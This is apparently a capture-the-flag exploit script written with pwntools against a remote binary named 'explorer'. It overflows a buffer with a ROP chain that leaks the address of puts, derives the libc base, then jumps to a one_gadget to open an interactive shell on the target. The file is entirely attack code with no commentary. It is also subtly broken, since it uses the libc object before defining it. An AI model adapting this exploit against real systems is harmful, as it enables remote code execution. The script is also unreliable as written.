from pwn import *
import time

pop_rdi_ret = 0x462b47
castle42590 = 0x7F1126 
puts_got = 0x161f058
puts_plt = 0x400640 
offset_puts = libc.symbols['puts']
offset_one_gadget = 0x4526a
#r = process("./explorer")
r = remote('125.235.240.168', 27016)
libc = ELF("./explorer_libc-2.23.so")
raw_input("?")

print r.recvuntil("Castle number: ")
r.sendline("42590")
time.sleep(1)
r.send("nSGDGJV\x00")
time.sleep(2)

payload = 'a'*0x10
payload += 'B'*8
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(castle42590)
r.sendline(payload)
r.recv()

puts = u64(r.recv()[1:-1]+"\x00\x00")
libc = puts - offset_puts
one_gadget = libc + offset_one_gadget  
log.info("puts: %#x",puts)
log.info("libc: %#x",libc)
log.info("one_gadget: %#x",one_gadget)

time.sleep(1)
r.send("nSGDGJV\x00")
time.sleep(2)
payload = 'a'*0x10
payload += 'B'*8
payload += p64(one_gadget)
r.sendline(payload)

r.interactive()